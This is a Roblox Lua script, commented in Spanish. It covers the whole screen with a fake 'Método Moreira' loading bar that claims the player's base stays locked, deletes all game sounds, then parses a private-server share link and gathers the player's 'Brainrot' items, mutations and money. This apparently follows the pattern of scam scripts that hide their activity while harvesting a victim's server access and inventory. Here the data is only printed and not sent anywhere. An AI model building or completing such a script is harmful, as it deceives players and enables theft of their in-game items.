local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local SoundService = game:GetService("SoundService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Crear interfaz de carga
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.IgnoreGuiInset = true
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = CoreGui
ScreenGui.Name = "FullLoadingScreen"

-- Fondo negro que cubre toda la pantalla
local Background = Instance.new("Frame")
Background.Size = UDim2.new(1, 0, 1, 0)
Background.Position = UDim2.new(0, 0, 0, 0)
Background.BackgroundColor3 = Color3.new(0, 0, 0)
Background.ZIndex = 10
Background.Parent = ScreenGui

-- Texto superior
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 100)
Title.Position = UDim2.new(0, 0, 0.35, 0)
Title.BackgroundTransparency = 1
Title.Text = "Cargando Método Moreira"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.Font = Enum.Font.SourceSansBold
Title.ZIndex = 11
Title.Parent = Background

-- Marco de la barra de carga
local BarFrame = Instance.new("Frame")
BarFrame.Size = UDim2.new(0.5, 0, 0.05, 0)
BarFrame.Position = UDim2.new(0.25, 0, 0.55, 0)
BarFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
BarFrame.BorderSizePixel = 0
BarFrame.ZIndex = 11
BarFrame.Parent = Background

-- Barra de progreso
local ProgressBar = Instance.new("Frame")
ProgressBar.Size = UDim2.new(0, 0, 1, 0)
ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 127)
ProgressBar.BorderSizePixel = 0
ProgressBar.ZIndex = 12
ProgressBar.Parent = BarFrame

-- Texto de porcentaje
local Percentage = Instance.new("TextLabel")
Percentage.Size = UDim2.new(1, 0, 1, 0)
Percentage.Position = UDim2.new(0, 0, 0, 0)
Percentage.BackgroundTransparency = 1
Percentage.Text = "0%"
Percentage.TextColor3 = Color3.fromRGB(255, 255, 255)
Percentage.TextScaled = true
Percentage.Font = Enum.Font.SourceSansBold
Percentage.ZIndex = 13
Percentage.Parent = BarFrame

-- Texto inferior (nuevo)
local SubText = Instance.new("TextLabel")
SubText.Size = UDim2.new(1, 0, 0, 50)
SubText.Position = UDim2.new(0, 0, 0.63, 0)
SubText.BackgroundTransparency = 1
SubText.Text = "Tu base se mantendrá bloqueada hasta que termine la carga.."
SubText.TextColor3 = Color3.fromRGB(200, 200, 200)
SubText.TextScaled = true
SubText.Font = Enum.Font.SourceSans
SubText.ZIndex = 11
SubText.Parent = Background

-- Función para eliminar sonidos del juego
local function eliminarSonidos()
	for _, descendant in ipairs(Workspace:GetDescendants()) do
		if descendant:IsA("Sound") or descendant:IsA("AudioEmitter") then
			descendant:Destroy()
		end
	end
	for _, descendant in ipairs(SoundService:GetDescendants()) do
		if descendant:IsA("Sound") or descendant:IsA("AudioEmitter") then
			descendant:Destroy()
		end
	end
end

-- Quitar todos los sonidos existentes
eliminarSonidos()

-- Cargar del 1% al 100%
task.spawn(function()
	for i = 1, 100 do
		ProgressBar.Size = UDim2.new(i / 100, 0, 1, 0)
		Percentage.Text = i .. "%"
		task.wait(0.05)
	end
end)

-- Función para validar el link
local function isLinkValid(link)
    local startPart = "https://www.roblox.com/share?code="
    local endPart = "&type=Server"
    return string.sub(link, 1, #startPart) == startPart and string.sub(link, -#endPart) == endPart
end

-- Función para extraer datos del servidor y del jugador
local function extractData(link, player)
    -- Extraer el código del servidor del link
    local codeStart, codeEnd = string.find(link, "code=(.*)&type=Server")
    local serverCode = string.sub(link, codeStart + 5, codeEnd - 1)

    -- Obtener el servidor usando el código
    local server = game:GetService("TeleportService"):GetPrivateServerInfoAsync(serverCode)

    -- Obtener los brainrots del jugador
    local brainrots = {}
    for _, child in pairs(player.Backpack:GetChildren()) do
        if child:IsA("Tool") and child.Name:match("Brainrot") then
            table.insert(brainrots, {
                Name = child.Name,
                Mutations = child:FindFirstChild("Mutations") and child.Mutations.Value or "No Mutations",
                Money = child:FindFirstChild("Money") and child.Money.Value or 0
            })
        end
    end

    return {
        ServerLink = link,
        ServerInfo = server,
        Brainrots = brainrots
    }
end

-- Función principal para manejar la validación y extracción de datos
local function handleLinkValidationAndDataExtraction(link, player)
    if isLinkValid(link) then
        local data = extractData(link, player)
        print("Datos extraídos:")
        print("Link del servidor:", data.ServerLink)
        print("Información del servidor:", data.ServerInfo)
        print("Brainrots del jugador:")
        for _, brainrot in ipairs(data.Brainrots) do
            print("Nombre:", brainrot.Name)
            print("Mutaciones:", brainrot.Mutations)
            print("Dinero:", brainrot.Money)
        end
    else
        print("El link no es válido")
    end
end

-- Ejemplo de uso: validar y extraer datos para un link y un jugador específicos
local exampleLink = "https://www.roblox.com/share?code=1234567890&type=Server"
local examplePlayer = Players.LocalPlayer
handleLinkValidationAndDataExtraction(exampleLink, examplePlayer)
